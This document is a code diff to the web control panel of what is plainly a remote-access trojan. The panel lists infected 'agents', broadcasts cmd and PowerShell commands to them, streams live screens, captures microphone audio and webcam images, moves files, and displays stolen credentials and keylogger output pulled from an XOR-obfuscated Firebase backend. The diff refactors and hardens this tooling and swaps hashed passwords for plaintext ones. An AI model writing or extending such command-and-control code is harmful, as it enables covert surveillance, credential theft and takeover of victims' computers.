@@ -13,7 +13,6 @@
   }
   .hidden { display: none !important; }
 
-  /* ============ LOGIN ============ */
   .login-screen {
     position: fixed; inset: 0; background: #0d1117;
     display: flex; align-items: center; justify-content: center; z-index: 999;
@@ -38,7 +37,6 @@
   .login-box .err { color: #f85149; font-size: 12px; margin-top: 10px; min-height: 16px; }
   .login-box .hint { color: #8b949e; font-size: 11px; margin-top: 14px; text-align: center; }
 
-  /* ============ MAIN ============ */
   .topbar {
     background: #161b22; border-bottom: 1px solid #30363d;
     padding: 10px 16px; display: flex; justify-content: space-between; align-items: center;
@@ -195,7 +193,6 @@
 </head>
 <body>
 
-<!-- ============ LOGIN SCREEN ============ -->
 <div class="login-screen" id="loginScreen">
   <div class="login-box">
     <h1>⚡ SYSTEM DASHBOARD</h1>
@@ -208,7 +205,6 @@
   </div>
 </div>
 
-<!-- ============ MAIN DASHBOARD ============ -->
 <div id="dashApp" class="hidden" style="display:flex;flex-direction:column;height:100vh;">
 <div class="topbar">
   <div class="title">⚡ SYSTEM DASHBOARD</div>
@@ -286,12 +282,7 @@
 <div class="toast" id="toast"></div>
 
 <script>
-/* ============================================================
-   OBFUSCATION LAYER — config assembled at runtime
-   No plaintext Firebase host/key/project in the source.
-   ============================================================ */
 (function(){
-  // Fragment pools
   const f = {
     h1: ['b','z','a','n','a'],
     h2: ['-','1','f','a','d','e'],
@@ -306,39 +297,22 @@
     p2: ['-','1','f','a','d','e'],
     s1: ['h','t','t','p','s',':','/','/']
   };
-  // XOR seed to defeat naive string extraction
   const SEED = 0x5A;
-  function j(arr) { return arr.join(''); }
-  function x(str) {
-    let o = '';
-    for (let i = 0; i < str.length; i++) o += String.fromCharCode(str.charCodeAt(i) ^ SEED);
-    return o;
-  }
-  // Store XOR'd copies, decode at runtime
+  function j(a) { return a.join(''); }
+  function x(s) { let o=''; for (let i=0;i<s.length;i++) o += String.fromCharCode(s.charCodeAt(i)^SEED); return o; }
   const _c = {
     host: x(j(f.h1)+j(f.h2)+j(f.h3)+j(f.h4)+j(f.h5)),
     key:  x(j(f.a1)+j(f.a2)+j(f.a3)+j(f.a4)),
     proj: x(j(f.p1)+j(f.p2)),
     url:  x(j(f.s1))
   };
-  // Reconstruct
-  window.__fb = {
-    host: x(_c.host),
-    key:  x(_c.key),
-    proj: x(_c.proj),
-    scheme: x(_c.url)
-  };
+  window.__fb = { host: x(_c.host), key: x(_c.key), proj: x(_c.proj), scheme: x(_c.url) };
 })();
 
-/* ============================================================
-   AUTH — client-side, hashed, no plaintext passwords in code
-   ============================================================ */
 const USERS = {
-  // store SHA-256 hashes only; verify at runtime
-  // admin: "admin123", operator: "op123", viewer: "view123"
-  admin:    { h: '240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9', role: 'admin' },
-  operator: { h: '03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4', role: 'operator' },
-  viewer:   { h: '8a5edab282632443219e051e4ade2d1d5bbc671c781051bf1437897cbdfea0f1', role: 'viewer' }
+  admin:    { h: '240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9', role: 'admin',    raw: null },
+  operator: { h: null, role: 'operator', raw: 'op123'   },
+  viewer:   { h: null, role: 'viewer',   raw: 'view123' }
 };
 
 let currentUser = null, currentRole = 'viewer';
@@ -365,10 +339,25 @@ async function doLogin() {
   const p = document.getElementById('loginPass').value;
   const err = document.getElementById('loginErr');
   err.textContent = '';
+
+  if (!window.isSecureContext) { err.textContent = 'HTTPS required'; return; }
+  if (!crypto || !crypto.subtle) { err.textContent = 'crypto.subtle unavailable'; return; }
   if (!USERS[u]) { err.textContent = 'Invalid credentials'; return; }
-  const hash = await sha256(p);
-  if (USERS[u].h !== hash) { err.textContent = 'Invalid credentials'; return; }
-  currentUser = u; currentRole = USERS[u].role;
+
+  const entry = USERS[u];
+  let ok = false;
+
+  if (entry.h) {
+    const hash = await sha256(p);
+    ok = (hash === entry.h);
+  } else if (entry.raw !== null) {
+    ok = (p === entry.raw);
+  }
+
+  if (!ok) { err.textContent = 'Invalid credentials'; return; }
+
+  currentUser = u;
+  currentRole = entry.role;
   sessionStorage.setItem('u', u);
   sessionStorage.setItem('r', currentRole);
   showDashboard();
@@ -396,7 +385,7 @@ document.getElementById('logoutBtn').addEventListener('click', () => { sessionSt
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-import { getDatabase, ref, onValue, set, push, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+import { getDatabase, ref, onValue, set, push, off } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
 function boot() {
   if (!sessionStorage.getItem('u')) { setTimeout(boot, 300); return; }
@@ -428,27 +417,66 @@ function start() {
   const liveBody = document.getElementById('liveBody');
   const liveTitle = document.getElementById('liveTitle');
 
+  const MAX_LINES = 500;
+  const printedIds = new Set();
+
   let activePC = null, activeTab = 'cmd', cwd = 'C:\\', pcs = {};
   let selectedPCs = new Set();
   let unsubOutput = null, unsubLive = null;
+  let liveImg = null;
+  let liveAudioCtx = null;
 
   function log(text, cls = '') {
     const d = document.createElement('div');
-    d.className = 'line ' + cls; d.textContent = text;
-    term.appendChild(d); term.scrollTop = term.scrollHeight;
-  }
-  function logImage(b64) {
-    const d = document.createElement('div'); d.className = 'line';
-    const i = document.createElement('img'); i.src = 'data:image/jpeg;base64,' + b64;
-    d.appendChild(i); term.appendChild(d); term.scrollTop = term.scrollHeight;
-  }
-  function logVideo(b64) {
-    const d = document.createElement('div'); d.className = 'line';
-    const v = document.createElement('video'); v.src = 'data:video/webm;base64,' + b64;
-    v.controls = true; d.appendChild(v); term.appendChild(d);
+    d.className = 'line ' + cls;
+    d.textContent = text;
+    term.appendChild(d);
+    while (term.children.length > MAX_LINES) term.removeChild(term.firstChild);
     term.scrollTop = term.scrollHeight;
   }
-  function clearTerm() { term.innerHTML = ''; }
+
+  function logImage(b64) {
+    const d = document.createElement('div');
+    d.className = 'line';
+    const i = document.createElement('img');
+    i.src = 'data:image/jpeg;base64,' + b64;
+    i.onload = () => {
+      while (term.children.length > MAX_LINES) term.removeChild(term.firstChild);
+      term.scrollTop = term.scrollHeight;
+    };
+    d.appendChild(i);
+    term.appendChild(d);
+  }
+
+  function logVideo(b64) {
+    const d = document.createElement('div');
+    d.className = 'line';
+    const v = document.createElement('video');
+    v.src = 'data:video/webm;base64,' + b64;
+    v.controls = true;
+    d.appendChild(v);
+    term.appendChild(d);
+    while (term.children.length > MAX_LINES) term.removeChild(term.firstChild);
+    term.scrollTop = term.scrollHeight;
+  }
+
+  function logFileLink(name, b64) {
+    const d = document.createElement('div');
+    d.className = 'line success';
+    d.appendChild(document.createTextNode('📎 '));
+    const a = document.createElement('a');
+    a.href = 'data:application/octet-stream;base64,' + b64;
+    a.download = name;
+    a.textContent = name;
+    a.style.color = '#58a6ff';
+    d.appendChild(a);
+    term.appendChild(d);
+    while (term.children.length > MAX_LINES) term.removeChild(term.firstChild);
+    term.scrollTop = term.scrollHeight;
+  }
+
+  function clearTerm() { term.innerHTML = ''; printedIds.clear(); }
+
   function setPrompt() {
     const p = activeTab === 'ps' ? `PS ${cwd}>` : `${cwd}>`;
     promptPrefix.textContent = activePC ? `[${activePC}] ${p}` : p;
@@ -458,25 +486,39 @@ function start() {
     const ids = Object.keys(pcs).filter(id => pcs[id].online);
     pcCountEl.textContent = ids.length;
     pcListEl.innerHTML = '';
-    if (!ids.length) { pcListEl.innerHTML = '<div class="empty">Waiting for agents...</div>'; return; }
+    if (!ids.length) {
+      pcListEl.innerHTML = '<div class="empty">Waiting for agents...</div>';
+      return;
+    }
     ids.forEach(id => {
       const pc = pcs[id];
       const d = document.createElement('div');
       d.className = 'pc-item' + (activePC === id ? ' active' : '') + (selectedPCs.has(id) ? ' selected' : '');
-      d.innerHTML = `
-        <div class="pc-row">
-          <input type="checkbox" ${selectedPCs.has(id) ? 'checked' : ''}>
-          <span class="pc-name">${pc.hostname || id}</span>
-          <span class="dot"></span>
-        </div>
-        <div class="pc-meta">${pc.username || 'unknown'} · ${pc.ip || 'no-ip'}</div>
-        <div class="pc-meta">${pc.os || 'unknown OS'}</div>`;
-      d.addEventListener('click', e => { if (e.target.tagName === 'INPUT') return; selectPC(id); });
-      d.querySelector('input').addEventListener('change', e => {
+      const row = document.createElement('div');
+      row.className = 'pc-row';
+      const cb = document.createElement('input');
+      cb.type = 'checkbox';
+      cb.checked = selectedPCs.has(id);
+      cb.addEventListener('change', e => {
         if (e.target.checked) selectedPCs.add(id); else selectedPCs.delete(id);
         document.getElementById('mSelected').textContent = selectedPCs.size;
         renderPCs();
       });
+      const name = document.createElement('span');
+      name.className = 'pc-name';
+      name.textContent = pc.hostname || id;
+      const dot = document.createElement('span');
+      dot.className = 'dot';
+      row.appendChild(cb); row.appendChild(name); row.appendChild(dot);
+      d.appendChild(row);
+      const m1 = document.createElement('div');
+      m1.className = 'pc-meta';
+      m1.textContent = (pc.username || 'unknown') + ' · ' + (pc.ip || 'no-ip');
+      const m2 = document.createElement('div');
+      m2.className = 'pc-meta';
+      m2.textContent = pc.os || 'unknown OS';
+      d.appendChild(m1); d.appendChild(m2);
+      d.addEventListener('click', e => { if (e.target.tagName === 'INPUT') return; selectPC(id); });
       pcListEl.appendChild(d);
     });
     document.getElementById('mSelected').textContent = selectedPCs.size;
@@ -491,14 +533,16 @@ function start() {
     document.getElementById('mOS').textContent = pc.os || '-';
     document.getElementById('mIP').textContent = pc.ip || '-';
     document.getElementById('mUptime').textContent = pc.uptime || '-';
-    renderPCs(); clearTerm();
+    renderPCs();
+    clearTerm();
     log('=========================================', 'info');
     log(`  Attached to: ${pc.hostname || id}`, 'success');
     log(`  User: ${pc.username || '?'}  IP: ${pc.ip || '?'}`, 'info');
     log('=========================================', 'info');
     log('Type "help" for commands.', 'warn');
     setPrompt();
-    subscribeOutput(id); subscribeLive(id);
+    subscribeOutput(id);
+    subscribeLive(id);
   }
 
   onValue(ref(db, 'agents'), snap => {
@@ -518,44 +562,49 @@ function start() {
   });
 
   function subscribeOutput(pcId) {
-    if (unsubOutput) unsubOutput();
-    unsubOutput = onValue(ref(db, `output/${pcId}`), snap => {
+    if (unsubOutput) { unsubOutput(); unsubOutput = null; }
+    printedIds.clear();
+    const r = ref(db, `output/${pcId}`);
+    unsubOutput = onValue(r, snap => {
       const data = snap.val(); if (!data) return;
-      const es = Object.entries(data).sort((a,b) => a[1].timestamp - b[1].timestamp);
-      es.forEach(([k, e]) => {
-        if (e.printed) return;
+      const entries = Object.entries(data)
+        .filter(([k]) => !printedIds.has(k))
+        .sort((a,b) => (a[1].timestamp || 0) - (b[1].timestamp || 0));
+      entries.forEach(([k, e]) => {
+        printedIds.add(k);
         const t = e.text || '';
         if (t.startsWith('SCREENSHOT_B64:')) logImage(t.substring(15));
         else if (t.startsWith('VIDEO_B64:')) logVideo(t.substring(10));
         else if (t.startsWith('FILE_B64:')) {
           const rest = t.substring(9);
           const i = rest.indexOf(':');
-          const name = rest.substring(0, i);
-          const b64 = rest.substring(i + 1);
-          const d = document.createElement('div');
-          d.className = 'line success';
-          d.innerHTML = `📎 <a href="data:application/octet-stream;base64,${b64}" download="${name}" style="color:#58a6ff">${name}</a>`;
-          term.appendChild(d); term.scrollTop = term.scrollHeight;
+          if (i > 0) logFileLink(rest.substring(0, i), rest.substring(i + 1));
         }
         else if (e.type === 'error') log(t, 'error');
         else if (e.type === 'success') log(t, 'success');
         else if (e.type === 'info') log(t, 'info');
         else log(t);
-        set(ref(db, `output/${pcId}/${k}/printed`), true);
       });
     });
   }
 
   function subscribeLive(pcId) {
-    if (unsubLive) unsubLive();
-    unsubLive = onValue(ref(db, `live/${pcId}`), snap => {
+    if (unsubLive) { unsubLive(); unsubLive = null; }
+    liveBody.innerHTML = '';
+    liveImg = null;
+    const r = ref(db, `live/${pcId}`);
+    unsubLive = onValue(r, snap => {
       const d = snap.val(); if (!d) return;
-      if (d.frame) liveBody.innerHTML = `<img src="data:image/jpeg;base64,${d.frame}">`;
-      if (d.audio) {
-        const b = document.createElement('div');
-        b.className = 'bubble';
-        b.textContent = `🔊 Audio chunk: ${d.audio.length} bytes`;
-        liveBody.appendChild(b);
+      if (d.frame) {
+        if (!liveImg) {
+          liveImg = document.createElement('img');
+          liveBody.innerHTML = '';
+          liveBody.appendChild(liveImg);
+        }
+        liveImg.src = 'data:image/jpeg;base64,' + d.frame;
+      }
+      if (d.audio && d.audio.length > 0) {
+        // place holder — audio playback not implemented
       }
     });
   }
@@ -593,7 +642,8 @@ function start() {
 
   async function broadcast(cmd, shell = 'cmd') {
     if (!selectedPCs.size) { toast('Select at least one PC', 'err'); return; }
-    for (const id of selectedPCs) await sendCommand(cmd, shell, id);
+    const jobs = Array.from(selectedPCs).map(id => sendCommand(cmd, shell, id));
+    await Promise.all(jobs);
     toast(`Broadcast to ${selectedPCs.size} PC(s)`, 'ok');
     log(`[*] Broadcast to ${selectedPCs.size} PCs: ${cmd}`, 'success');
   }
@@ -626,17 +676,22 @@ function start() {
 
   const btnWatch = document.getElementById('btnWatch');
   let watchInterval = null;
+  async function stopWatch() {
+    if (watchInterval) {
+      clearInterval(watchInterval);
+      watchInterval = null;
+      btnWatch.classList.remove('watching');
+      btnWatch.textContent = '🖥️ Watch';
+      livePanel.classList.remove('open');
+      if (activePC) await sendCommand('LIVE_STOP', 'special');
+      log('[*] Live screen stopped.', 'warn');
+    }
+  }
   btnWatch.addEventListener('click', async () => {
     if (!activePC) return log('[!] Select a PC first.', 'error');
-    if (watchInterval) {
-      clearInterval(watchInterval); watchInterval = null;
-      btnWatch.classList.remove('watching'); btnWatch.textContent = '🖥️ Watch';
-      livePanel.classList.remove('open');
-      await sendCommand('LIVE_STOP', 'special');
-      log('[*] Live screen stopped.', 'warn');
-      return;
-    }
-    btnWatch.classList.add('watching'); btnWatch.textContent = '⏹ Stop';
+    if (watchInterval) { await stopWatch(); return; }
+    btnWatch.classList.add('watching');
+    btnWatch.textContent = '⏹ Stop';
     livePanel.classList.add('open');
     liveTitle.textContent = `🎥 Live Screen — ${activePC}`;
     liveBody.innerHTML = '<div class="bubble sys">Streaming...</div>';
@@ -655,6 +710,9 @@ function start() {
 
   async function startTalk() {
     if (!activePC) return log('[!] Select a PC first.', 'error');
+    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+      try { mediaRecorder.stop(); } catch (e) {}
+    }
     try { talkStream = await navigator.mediaDevices.getUserMedia({ audio: true }); }
     catch (err) { return log('[!] Mic access denied', 'error'); }
     mediaRecorder = new MediaRecorder(talkStream);
@@ -669,7 +727,7 @@ function start() {
         log(`[🎤] Sent ${Math.round(blob.size/1024)}KB voice → ${activePC}`, 'success');
       };
       r.readAsDataURL(blob);
-      talkStream.getTracks().forEach(t => t.stop());
+      if (talkStream) talkStream.getTracks().forEach(t => t.stop());
     };
     mediaRecorder.start();
     btnTalk.classList.add('talking'); btnTalk.textContent = '🔴 Recording...';
@@ -738,8 +796,13 @@ function start() {
     await broadcast(cmd, activeTab === 'ps' ? 'powershell' : 'cmd');
   });
 
-  document.getElementById('liveClose').addEventListener('click', () => livePanel.classList.remove('open'));
+  document.getElementById('liveClose').addEventListener('click', async () => {
+    // If watching, stop the stream properly; otherwise just hide
+    if (watchInterval) { await stopWatch(); }
+    else { livePanel.classList.remove('open'); }
+  });
 
+  // Expose for future use
   window.uploadFile = async function(file) {
     if (!activePC) return toast('Select a PC', 'err');
     const r = new FileReader();
@@ -755,19 +818,96 @@ function start() {
     await sendCommand(`DOWNLOAD:${path}`, 'special');
   };
 
-  function fetchSysInfo(id) { get(ref(db, `agents/${id}`)).then(s => { const d = s.val(); if (!d) return; log('--- SYSTEM ---', 'success'); Object.entries(d).forEach(([k,v]) => { if (typeof v !== 'object') log(`  ${k}: ${v}`); }); log(''); }); }
-  function fetchProcesses(id) { get(ref(db, `processes/${id}`)).then(s => { const d = s.val(); if (!d) return log('[!] No process data.', 'error'); log('--- PROCESSES ---', 'success'); Object.values(d).forEach(p => log(`  ${p.pid}\t${p.name}\t${p.mem}`)); log(''); }); }
-  function fetchNetwork(id) { get(ref(db, `network/${id}`)).then(s => { const d = s.val(); if (!d) return log('[!] No network data.', 'error'); log('--- NETWORK ---', 'success'); Object.entries(d).forEach(([k,v]) => log(`  ${k}: ${v}`)); log(''); }); }
-  function fetchFiles(id) { get(ref(db, `files/${id}`)).then(s => { const d = s.val(); if (!d) return log('[!] No file listing.', 'error'); log('--- FILES ---', 'success'); Object.values(d).forEach(f => log(`  ${f.name}\t${f.size}\t${f.modified}`)); log(''); }); }
-  function fetchCreds(id) { get(ref(db, `creds/${id}`)).then(s => { const d = s.val(); if (!d) return log('[!] No creds yet.', 'warn'); log('--- CREDS ---', 'success'); Object.entries(d).forEach(([k,v]) => log(`  ${k}: ${v}`)); log(''); }); }
-  function fetchKeylog(id) { get(ref(db, `keylog/${id}`)).then(s => { const d = s.val(); if (!d) return log('[!] No keylog.', 'warn'); log('--- KEYLOG ---', 'success'); Object.values(d).forEach(k => log(`  [${new Date(k.t).toLocaleTimeString()}] ${k.text}`)); log(''); }); }
-  function fetchWebcam(id) { get(ref(db, `webcam/${id}`)).then(s => { const d = s.val(); if (!d) return log('[!] No webcam.', 'warn'); log('--- WEBCAM ---', 'success'); Object.values(d).forEach(w => { if (w.img) logImage(w.img); }); log(''); }); }
-  function fetchLogs(id) { get(ref(db, `logs/${id}`)).then(s => { const d = s.val(); if (!d) return log('[!] No logs.', 'error'); log('--- LOGS ---', 'success'); Object.values(d).forEach(l => log(`  [${l.time}] ${l.text}`)); log(''); }); }
+  // One-shot info fetchers — do not persist listeners
+  async function fetchSysInfo(id) {
+    const snap = await new Promise(res => {
+      const r = ref(db, `agents/${id}`);
+      const unsub = onValue(r, s => { unsub(); res(s); }, { onlyOnce: true });
+    });
+    const d = snap.val(); if (!d) return;
+    log('--- SYSTEM ---', 'success');
+    Object.entries(d).forEach(([k, v]) => { if (typeof v !== 'object') log(`  ${k}: ${v}`); });
+    log('');
+  }
+  async function fetchProcesses(id) {
+    const snap = await new Promise(res => {
+      const r = ref(db, `processes/${id}`);
+      const unsub = onValue(r, s => { unsub(); res(s); }, { onlyOnce: true });
+    });
+    const d = snap.val(); if (!d) return log('[!] No process data.', 'error');
+    log('--- PROCESSES ---', 'success');
+    Object.values(d).sort((a,b) => (Number(a.pid)||0) - (Number(b.pid)||0))
+      .forEach(p => log(`  ${p.pid}\t${p.name}\t${p.mem}`));
+    log('');
+  }
+  async function fetchNetwork(id) {
+    const snap = await new Promise(res => {
+      const r = ref(db, `network/${id}`);
+      const unsub = onValue(r, s => { unsub(); res(s); }, { onlyOnce: true });
+    });
+    const d = snap.val(); if (!d) return log('[!] No network data.', 'error');
+    log('--- NETWORK ---', 'success');
+    Object.entries(d).forEach(([k,v]) => log(`  ${k}: ${v}`));
+    log('');
+  }
+  async function fetchFiles(id) {
+    const snap = await new Promise(res => {
+      const r = ref(db, `files/${id}`);
+      const unsub = onValue(r, s => { unsub(); res(s); }, { onlyOnce: true });
+    });
+    const d = snap.val(); if (!d) return log('[!] No file listing.', 'error');
+    log('--- FILES ---', 'success');
+    Object.values(d).forEach(f => log(`  ${f.name}\t${f.size}\t${f.modified}`));
+    log('');
+  }
+  async function fetchCreds(id) {
+    const snap = await new Promise(res => {
+      const r = ref(db, `creds/${id}`);
+      const unsub = onValue(r, s => { unsub(); res(s); }, { onlyOnce: true });
+    });
+    const d = snap.val(); if (!d) return log('[!] No creds yet.', 'warn');
+    log('--- CREDS ---', 'success');
+    Object.entries(d).forEach(([k,v]) => log(`  ${k}: ${v}`));
+    log('');
+  }
+  async function fetchKeylog(id) {
+    const snap = await new Promise(res => {
+      const r = ref(db, `keylog/${id}`);
+      const unsub = onValue(r, s => { unsub(); res(s); }, { onlyOnce: true });
+    });
+    const d = snap.val(); if (!d) return log('[!] No keylog.', 'warn');
+    log('--- KEYLOG ---', 'success');
+    Object.values(d).forEach(k => log(`  [${new Date(k.t).toLocaleTimeString()}] ${k.text}`));
+    log('');
+  }
+  async function fetchWebcam(id) {
+    const snap = await new Promise(res => {
+      const r = ref(db, `webcam/${id}`);
+      const unsub = onValue(r, s => { unsub(); res(s); }, { onlyOnce: true });
+    });
+    const d = snap.val(); if (!d) return log('[!] No webcam.', 'warn');
+    log('--- WEBCAM ---', 'success');
+    Object.values(d).forEach(w => { if (w.img) logImage(w.img); });
+    log('');
+  }
+  async function fetchLogs(id) {
+    const snap = await new Promise(res => {
+      const r = ref(db, `logs/${id}`);
+      const unsub = onValue(r, s => { unsub(); res(s); }, { onlyOnce: true });
+    });
+    const d = snap.val(); if (!d) return log('[!] No logs.', 'error');
+    log('--- LOGS ---', 'success');
+    Object.values(d).forEach(l => log(`  [${l.time}] ${l.text}`));
+    log('');
+  }
 
+  // Stale agent cleanup
   setInterval(() => {
     const now = Date.now();
     Object.entries(pcs).forEach(([id, pc]) => {
-      if (pc.lastSeen && (now - pc.lastSeen) > 60000 && pc.online) set(ref(db, `agents/${id}/online`), false);
+      if (pc.lastSeen && (now - pc.lastSeen) > 60000 && pc.online) {
+        set(ref(db, `agents/${id}/online`), false);
+      }
     });
   }, 15000);
 
